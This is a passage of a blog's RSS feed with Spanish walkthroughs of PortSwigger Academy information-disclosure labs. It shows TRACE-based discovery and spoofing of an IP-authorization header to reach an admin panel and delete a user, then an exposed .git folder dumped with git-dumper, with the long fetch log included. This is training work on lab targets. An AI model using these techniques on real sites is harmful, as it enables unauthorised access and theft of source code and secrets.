			width=&#34;1767&#34;
			height=&#34;333&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-4/requisito_hua8e49a0ba5a00a23d457661aaa39305a_19485_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-4/requisito_hua8e49a0ba5a00a23d457661aaa39305a_19485_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Solo esta disponible para usuarios en localhost&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Solo esta disponible para usuarios en localhost&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h2&gt;
&lt;p&gt;Ahora nos da una ruta donde seguir que es que seguramente envia un header la comunicacion para saber si se debe acceder o no dependiendo del header que es enviado, para eso utilizamos el metodo &lt;code&gt;TRACE&lt;/code&gt; que lo que hara es volver a imprimirnos todos los headers que son enviados en la peticion haciendo una especie de debugging.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 289; 
			flex-basis: 694px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-4/request.png&#34; data-size=&#34;1537x531&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-4/request.png&#34;
			width=&#34;1537&#34;
			height=&#34;531&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-4/request_hu67b904ae4a207b8dcc2434d50d391672_107155_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-4/request_hu67b904ae4a207b8dcc2434d50d391672_107155_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Envio de peticion con metodo TRACE&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Envio de peticion con metodo TRACE&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Encontramos un header interesante que es &lt;code&gt;X-Custom-IP-Authorization: &amp;lt;nuestraip&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Ahora lo que sabemos es que podemos cambiar esa ip para enviar la nuestra y actue como si nosotros estuvieramos en localhost y poder acceder a la funcion de admin&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 175; 
			flex-basis: 421px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-4/request2.png&#34; data-size=&#34;1535x873&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-4/request2.png&#34;
			width=&#34;1535&#34;
			height=&#34;873&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-4/request2_hu9b7939c82ed4b1f1612528f21d6e7f46_121167_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-4/request2_hu9b7939c82ed4b1f1612528f21d6e7f46_121167_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Peticion para recuperar la funcionalidad de admin&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Peticion para recuperar la funcionalidad de admin&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Ya sabemos que tenemos acceso ahora debemos eliminar al usuario carlos haciendo la peticion get que nos ha dado la respuesta anterior que es &lt;code&gt;/admin/delete?username=carlos&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 326; 
			flex-basis: 782px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-4/request3.png&#34; data-size=&#34;1539x472&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-4/request3.png&#34;
			width=&#34;1539&#34;
			height=&#34;472&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-4/request3_hu75a33bb2d6293d3a38086cc5c7967b87_65079_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-4/request3_hu75a33bb2d6293d3a38086cc5c7967b87_65079_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Eliminacion de usuario carlos&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Eliminacion de usuario carlos&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y ahora ingresamos la solucion y resolvimos el lab:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 269; 
			flex-basis: 646px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-4/resuelto.png&#34; data-size=&#34;1800x668&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-4/resuelto.png&#34;
			width=&#34;1800&#34;
			height=&#34;668&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-4/resuelto_hudd7490475328aad218f82b856bc53717_78558_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-4/resuelto_hudd7490475328aad218f82b856bc53717_78558_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-authentication-bypass&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: Information Disclosure Lab 5</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-5/</link>
        <pubDate>Wed, 15 Dec 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-5/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-5/head.png" alt="Featured image of post Portswigger Academy Learning Path: Information Disclosure Lab 5" /&gt;&lt;h1 id=&#34;lab-source-code-disclosure-via-backup-files&#34;&gt;Lab: Source code disclosure via backup files&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder mostrar en la aplicacion informacion de la infraestructura, software o algo que revele informacion del sistema. Esta vulnerabilidad mas conocida como &lt;code&gt;Information Disclosure&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Lo primero que tenemos es una aplicacion que parece todo normal, pero existe algo que al realizar una busqueda el sitio cuenta con una carpeta &lt;code&gt;.git&lt;/code&gt; que nos dice eso que estan haciendo uso de git para el versionado de la aplicacion y esta carpeta es la que lleva el historial de todos los cambios en el sitio web.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 97; 
			flex-basis: 233px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-5/git.png&#34; data-size=&#34;621x638&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-5/git.png&#34;
			width=&#34;621&#34;
			height=&#34;638&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-5/git_hu41dea0547ad82bd1f76dd071a623a11b_40936_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-5/git_hu41dea0547ad82bd1f76dd071a623a11b_40936_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Archivos de git&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Archivos de git&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h2&gt;
&lt;p&gt;Todos estos archivos nos puede llevar a rastrear cambios, visualizar la contrasena del administrador que pudo estar en estor archivos ya que todo el cambio ahi esta registrado y estara el log y podemos regresar a cambios anteriores. Para eso debemos descargar en local toda la carpeta para trabajar con ella, pero con wget se vuelve muy complicado y por eso existe una tool muy buena que es git-dumper que nos descarga la carpeta completa, esta se instala con pip.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;pip install git-dumper
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ahora la lanzamos con el sitio y la carpeta .git y la carpeta en la que queremos que se guarden todos nuestros archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;alux@rootsystems:~/tools$ git-dumper https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git &lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Testing https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/HEAD &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;200&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Testing https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/ &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;200&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Fetching common files
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Fetching https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/hooks/post-receive.sample &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;404&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/hooks/post-receive.sample responded with status code &lt;span class=&#34;m&#34;&gt;404&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Fetching https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.gitignore &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;404&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.gitignore responded with status code &lt;span class=&#34;m&#34;&gt;404&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Fetching https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/hooks/post-update.sample &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;200&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Fetching https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/COMMIT_EDITMSG &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;200&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Fetching https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/hooks/commit-msg.sample &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;200&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Fetching https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/hooks/post-commit.sample &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;404&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/hooks/post-commit.sample responded with status code &lt;span class=&#34;m&#34;&gt;404&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Fetching https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/hooks/pre-applypatch.sample &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;200&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Fetching https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/hooks/applypatch-msg.sample &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;200&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Fetching https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/description &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;200&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Fetching https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/hooks/pre-push.sample &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;200&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Fetching https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/hooks/pre-commit.sample &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;200&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Fetching https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/hooks/prepare-commit-msg.sample &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;200&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Fetching https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/hooks/pre-rebase.sample &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;200&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Fetching https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/index &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;200&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Fetching https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/hooks/pre-receive.sample &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;200&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Fetching https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/objects/info/packs &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;404&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/objects/info/packs responded with status code &lt;span class=&#34;m&#34;&gt;404&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Fetching https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/hooks/update.sample &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;200&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Fetching https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/info/exclude &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;200&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Finding refs/
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Fetching https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/HEAD &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;200&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Fetching https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/FETCH_HEAD &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;404&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/FETCH_HEAD responded with status code &lt;span class=&#34;m&#34;&gt;404&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Fetching https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/logs/HEAD &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;200&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Fetching https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/info/refs &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;404&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/info/refs responded with status code &lt;span class=&#34;m&#34;&gt;404&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Fetching https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/config &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;200&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Fetching https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/ORIG_HEAD &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;404&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/ORIG_HEAD responded with status code &lt;span class=&#34;m&#34;&gt;404&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Fetching https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/logs/refs/heads/master &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;200&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Fetching https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/logs/refs/remotes/origin/master &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;404&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/logs/refs/remotes/origin/master responded with status code &lt;span class=&#34;m&#34;&gt;404&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Fetching https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/logs/refs/remotes/origin/HEAD &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;404&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/logs/refs/remotes/origin/HEAD responded with status code &lt;span class=&#34;m&#34;&gt;404&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Fetching https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/logs/refs/stash &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;404&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/logs/refs/stash responded with status code &lt;span class=&#34;m&#34;&gt;404&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Fetching https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/packed-refs &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;404&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/packed-refs responded with status code &lt;span class=&#34;m&#34;&gt;404&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Fetching https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/refs/heads/master &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;200&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Fetching https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/refs/wip/wtree/refs/heads/master &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;404&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/refs/wip/wtree/refs/heads/master responded with status code &lt;span class=&#34;m&#34;&gt;404&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Fetching https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/refs/stash &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;404&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/refs/stash responded with status code &lt;span class=&#34;m&#34;&gt;404&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Fetching https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/refs/remotes/origin/HEAD &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;404&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/refs/remotes/origin/HEAD responded with status code &lt;span class=&#34;m&#34;&gt;404&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Fetching https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/refs/remotes/origin/master &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;404&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/refs/remotes/origin/master responded with status code &lt;span class=&#34;m&#34;&gt;404&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Fetching https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/refs/wip/index/refs/heads/master &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;404&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/refs/wip/index/refs/heads/master responded with status code &lt;span class=&#34;m&#34;&gt;404&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Finding packs
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Finding objects
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Fetching objects
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Fetching https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/objects/89/44e3b9853691431dc58d5f4978d3940cea4af2 &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;200&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Fetching https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/objects/fd/566ec1574b5eb704b3b69a275cdedf33dfc1b9 &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;200&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
